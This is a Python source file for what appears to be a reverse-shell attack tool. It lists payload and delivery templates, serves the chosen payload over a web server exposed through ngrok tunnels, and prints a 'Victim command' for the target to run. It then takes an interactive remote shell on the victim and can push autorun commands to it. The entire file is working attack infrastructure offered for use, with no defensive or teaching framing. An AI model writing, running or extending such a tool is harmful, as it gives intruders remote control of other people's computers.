import socket, os, threading, time, sys, json
from http.server import BaseHTTPRequestHandler, HTTPServer
from pyngrok import ngrok

# Simple logging class
class Log:
    def info(self, msg):
        print("[*] " + msg)

    def error(self, msg):
        print("[!] " + msg)

    def verbose(self, msg):
        print("[!] " + msg)

    def success(self, msg):
        print("[+] " + msg)

    def inpt(self, msg):
        return input("[>] " + msg)

# The server the client will connect to
class RevServer:
    def __init__(self, host, port, autorun):
        self.log = Log()
        self.host = host
        self.port = port
        self.autorun = autorun

    def start(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((self.host, int(self.port)))
        s.listen(1)
        self.log.info("Listening on " + self.host + ":" + self.port)
        conn, addr = s.accept()
        self.log.info("Connection from " + addr[0] + ":" + str(addr[1]))
        if self.autorun:
            with open("Assets/autorun.txt", "r") as f:
                for line in f:
                    if line:
                        conn.send(line.encode())
                self.log.info("Autorun loaded, Press enter to continue")
        while True:
            ans = conn.recv(1024).decode()
            if ans:
                sys.stdout.write(ans)
            command = input()
            command += "\n"
            conn.send(command.encode())
            time.sleep(1)
            sys.stdout.write("\033[A"+ans.split("\n")[-1])
            if command == "exit\n":
                conn.close()
                self.log.error("Connection closed")
                exit()


# Creates an http server that returns the payload
def create_handler(payload):
    class PayServer(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(payload)

        def log_message(self, format, *args):
            print(f"[!] {self.address_string()} [{self.log_date_time_string()}] {format % args}")
    return PayServer

# Starts the ngrok servers
class NgrokServer:
    def __init__(self, key, local, revip, revport, hostip):
        self.log = Log()
        self.key = key
        self.revip = revip
        self.revport = revport
        self.hostip = hostip
        self.url = ""
        self.tcp_url = ""
        self.local = False if local != "y" else True

    def load_port(self):
        with open("Assets/config.json", "r") as f:
            data = json.load(f)
            return data.get("web_port")

    def start(self):
        if self.local:
            self.url = "http://" + self.hostip + ":" + str(self.load_port())
            return
        ngrok.set_auth_token(self.key)
        tunnel = ngrok.connect(self.load_port(), "http")
        self.url = tunnel.public_url
        self.log.info("Ngrok tunnel: " + tunnel.public_url)

    def tcp(self, port):
        if self.local:
            self.tcp_url = "tcp://" + self.revip + ":" + port
            return
        tunnel = ngrok.connect(port, "tcp")
        self.tcp_url = tunnel.public_url
        self.log.info("Ngrok tunnel: " + tunnel.public_url)

# Main function
class Main:
    def __init__(self):
        self.log = Log()
        # Loads ngrok key and setup
        self.key()
        self.setup()
        # Get the connection ports for the web server and reverse shell server
        self.web_host, self.web_port = self.load_host()
        self.rev_host = self.log.inpt("Reverse host: ")
        self.rev_port = self.log.inpt("Reverse port: ")
        # Load the payloads and deliveries
        self.payloads = [file.split(".")[0] for file in os.listdir("Assets/Payloads") if file.endswith(".txt")]
        self.deliveries = [file.split(".")[0] for file in os.listdir("Assets/Deliveries") if file.endswith(".txt")]
        # Get autorun and local
        autorun = self.log.inpt("Autorun?: ")
        self.local = self.log.inpt("Local?: ")
        self.autorun = False if autorun == "n" else True
        # Start the servers
        self.rev_server = RevServer(self.rev_host, self.rev_port, self.autorun)
        hostip, _ = self.load_host()
        self.ngrok_server = NgrokServer(self.key(), self.local, self.rev_host, self.rev_port, hostip)
        self.ngrok_server.tcp(self.rev_port)

    def setup(self):
        if not os.path.exists("Assets/config.json"):
            key = self.log.inpt("Ngrok Key: ")
            web_host = self.log.inpt("Web host: ")
            web_port = self.log.inpt("Web port: ")
            with open("Assets/config.json", "w") as f:
                json.dump({"ngrok_key": key, "web_host": web_host, "web_port": web_port}, f, indent=4)
            return

    def key(self):
        if not os.path.exists("Assets/config.json"):
            key = self.log.inpt("Ngrok key: ")
            with open("Assets/config.json", "w") as f:
                json.dump({"ngrok_key": key}, f, indent=4)
            return key
        with open("Assets/config.json", "r") as f:
            return json.load(f)["ngrok_key"]
        
    def load_host(self):
        with open("Assets/config.json", "r") as f:
            data = json.load(f)
            return data.get("web_host"), data.get("web_port")

    def load_payload(self, file):
        with open(f"Assets/Payloads/{file + '.txt'}", "r") as f:
            return f.read().replace("_IP_", self.ngrok_server.tcp_url.split("tcp://")[1].split(":")[0]).replace("_PORT_", self.ngrok_server.tcp_url.split("tcp://")[1].split(":")[1]).encode("utf-8")

    def load_delivery(self, file):
        with open(f"Assets/Deliveries/{file + '.txt'}", "r") as f:
            return f.read().replace("URL", self.url)

    def show_loads(self):
        self.log.verbose("Available payloads")
        loads = []
        for file in list(os.walk("Assets/Payloads")):
            for f in file[2]:
                if f.endswith(".txt"):
                    loads.append("".join(file[0].split("/")[2:]) + "/" + f.split(".")[0])
        for file in loads:
            self.log.info(file)

    def show_deliveries(self):
        self.log.verbose("Available deliveries")
        loads = []
        for file in list(os.walk("Assets/Deliveries")):
            for f in file[2]:
                if f.endswith(".txt"):
                    loads.append("".join(file[0].split("/")[2:]) + "/" + f.split(".")[0])
        for file in loads:
            self.log.info(file)

    def start_server(self, load):
        load = self.load_payload(load)
        self.log.info("Sellected payload: " + load.decode("utf-8"))
        handler = create_handler(load)
        with HTTPServer((self.web_host, self.web_port), handler) as httpd:
            httpd.serve_forever()

    def main(self):
        self.show_loads()
        payload = self.log.inpt("Payload: ")
        while not os.path.exists(f"Assets/Payloads/{payload + '.txt'}"):
            self.log.error("Invalid payload")
            payload = self.log.inpt("Payload: ")
        self.show_deliveries()
        delivery = self.log.inpt("Delivery: ")
        while not os.path.exists(f"Assets/Deliveries/{delivery + '.txt'}"):
            self.log.error("Invalid delivery")
            delivery = self.log.inpt("Delivery: ")
        self.ngrok_server.start()
        self.url = self.ngrok_server.url
        threading.Thread(target=self.start_server, args=(payload,)).start()
        self.log.info("Victim command: " + self.load_delivery(delivery))
        self.rev_server.start()
        input()

if __name__ == "__main__":
    main = Main()
    main.main()